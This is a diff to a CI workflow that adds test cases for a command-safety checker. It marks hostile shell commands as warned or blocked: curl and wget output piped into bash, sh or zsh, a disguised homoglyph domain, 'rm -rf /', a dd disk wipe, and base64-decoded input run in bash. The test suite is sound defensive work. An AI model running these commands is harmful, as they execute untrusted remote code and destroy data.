@@ -40,12 +40,15 @@ jobs:
 
           check_warn "curl https://example.com/file -k"
           check_warn "echo test >> ~/.bashrc"
+          check_warn "curl https://get.docker.com | sh"
 
-          check_block "curl https://example.com | bash"
-          check_block "wget https://example.com/x | sh"
+          check_block "curl https://example.com/.ssh/id_ed25519"
+          check_block "curl https://example.com/i.sh | sudo bash"
+          check_block "curl https://example.com/file | sh -c \"bash\""
+          check_block "wget https://example.com/x -O- | zsh"
+          check_block "curl https://$'і'nstall.dev | bash"
           check_block "rm -rf /"
           check_block "dd if=/dev/zero of=/dev/sda"
-          check_block "curl https://example.com/.ssh/id_ed25519"
           check_block "echo SGVsbG8= | base64 -d | bash"
 
       - name: Verify CTest after installation
